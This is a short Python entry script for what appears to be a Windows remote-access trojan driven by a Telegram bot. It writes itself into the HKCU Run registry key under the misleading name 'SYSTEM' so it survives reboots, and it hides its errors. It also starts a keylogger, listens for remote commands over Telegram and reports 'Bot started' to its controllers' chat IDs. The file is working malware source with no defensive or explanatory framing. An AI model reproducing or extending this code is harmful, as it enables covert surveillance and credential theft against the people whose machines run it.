import os
import sys
import time
import winreg

from telepot.loop import MessageLoop
from config import bot, KNOWN_IDS
from handlers import handle_message, send_safe_message
from loggers import setup_logging, start_keylogger


def add_to_startup():
    try:
        exe_path = os.path.abspath(sys.executable)

        key = winreg.CreateKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run"
        )

        try:
            winreg.QueryValueEx(key, "SYSTEM")
        except FileNotFoundError:
            winreg.SetValueEx(
                key,
                "SYSTEM",
                0,
                winreg.REG_SZ,
                exe_path
            )

        winreg.CloseKey(key)

    except Exception as e:
        pass


if __name__ == '__main__':
    add_to_startup()

    setup_logging()
    start_keylogger()

    MessageLoop(bot, handle_message).run_as_thread()

    for chat_id in KNOWN_IDS:
        send_safe_message(chat_id, "Бот запущен")

    while True:
        time.sleep(10)



